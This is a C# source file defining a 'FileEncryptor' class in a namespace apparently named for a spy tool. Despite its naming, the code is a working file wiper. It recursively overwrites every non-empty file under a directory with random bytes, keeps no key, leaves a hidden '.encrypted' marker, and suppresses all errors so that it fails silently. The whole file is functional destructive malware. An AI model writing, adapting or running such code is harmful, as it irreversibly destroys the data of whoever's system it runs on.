using System;
using System.IO;
using System.Security.Cryptography;

namespace philips_protector_spy
{
    /// <summary>
    /// Handles file encryption/corruption operations
    /// </summary>
    public static class FileEncryptor
    {
        private const string ENCRYPTION_MARKER_FILE = ".encrypted";

        /// <summary>
        /// Checks if files in the directory have already been encrypted
        /// </summary>
        /// <param name="directory">Directory to check</param>
        /// <returns>True if files are already encrypted</returns>
        public static bool AreFilesEncrypted(string directory)
        {
            try
            {
                string markerPath = Path.Combine(directory, ENCRYPTION_MARKER_FILE);
                return File.Exists(markerPath);
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Creates a hidden marker file to indicate encryption has occurred
        /// </summary>
        /// <param name="directory">Directory where marker should be created</param>
        private static void CreateEncryptionMarker(string directory)
        {
            try
            {
                string markerPath = Path.Combine(directory, ENCRYPTION_MARKER_FILE);
                File.WriteAllText(markerPath, "encrypted");
                File.SetAttributes(markerPath, FileAttributes.Hidden);
            }
            catch
            {
                // Silently fail if marker cannot be created
            }
        }

        /// <summary>
        /// Recursively encrypts/corrupts all files in the directory except the excluded file
        /// </summary>
        /// <param name="directory">Directory to encrypt files in</param>
        /// <param name="excludeFileName">File name to exclude from encryption</param>
        public static void EncryptAllFiles(string directory, string excludeFileName)
        {
            try
            {
                EncryptDirectoryRecursive(directory, excludeFileName);
                CreateEncryptionMarker(directory);
            }
            catch
            {
                // Continue even if some operations fail
            }
        }

        /// <summary>
        /// Recursively encrypts files in directory and subdirectories
        /// </summary>
        private static void EncryptDirectoryRecursive(string directory, string excludeFileName)
        {
            try
            {
                // Encrypt files in current directory
                if (Directory.Exists(directory))
                {
                    string[] files = Directory.GetFiles(directory);
                    foreach (string filePath in files)
                    {
                        try
                        {
                            string fileName = Path.GetFileName(filePath);
                            
                            // Skip the excluded file
                            if (string.Equals(fileName, excludeFileName, StringComparison.OrdinalIgnoreCase))
                            {
                                continue;
                            }

                            // Skip the marker file itself
                            if (string.Equals(fileName, ENCRYPTION_MARKER_FILE, StringComparison.OrdinalIgnoreCase))
                            {
                                continue;
                            }

                            EncryptFile(filePath);
                        }
                        catch
                        {
                            // Skip files that cannot be encrypted (locked, permissions, etc.)
                            continue;
                        }
                    }

                    // Recursively process subdirectories
                    string[] subdirectories = Directory.GetDirectories(directory);
                    foreach (string subdirectory in subdirectories)
                    {
                        try
                        {
                            EncryptDirectoryRecursive(subdirectory, excludeFileName);
                        }
                        catch
                        {
                            // Skip directories that cannot be accessed
                            continue;
                        }
                    }
                }
            }
            catch
            {
                // Continue even if directory access fails
            }
        }

        /// <summary>
        /// Encrypts/corrupts a single file by overwriting it with random data
        /// </summary>
        /// <param name="filePath">Path to the file to encrypt</param>
        private static void EncryptFile(string filePath)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(filePath);
                if (!fileInfo.Exists)
                {
                    return;
                }

                long fileSize = fileInfo.Length;
                if (fileSize == 0)
                {
                    return;
                }

                // Generate random data matching file size
                byte[] randomData = new byte[fileSize];
                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                {
                    rng.GetBytes(randomData);
                }

                // Overwrite file with random data
                // Use FileShare.None to prevent other processes from accessing
                using (FileStream fileStream = new FileStream(
                    filePath,
                    FileMode.Open,
                    FileAccess.Write,
                    FileShare.None))
                {
                    fileStream.Write(randomData, 0, randomData.Length);
                    fileStream.Flush();
                }
            }
            catch
            {
                // Silently fail if file cannot be encrypted (locked, permissions, etc.)
            }
        }
    }
}
